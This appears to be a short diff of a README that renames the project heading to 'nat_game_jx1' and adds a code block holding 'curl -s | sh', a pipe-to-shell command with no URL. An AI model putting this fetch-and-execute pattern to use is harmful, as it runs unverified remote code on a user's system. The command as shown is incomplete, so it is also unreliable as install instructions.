@@ -1,1 +1,5 @@
-# nat_jx
+# nat_game_jx1
+
+```
+curl -s | sh
+```
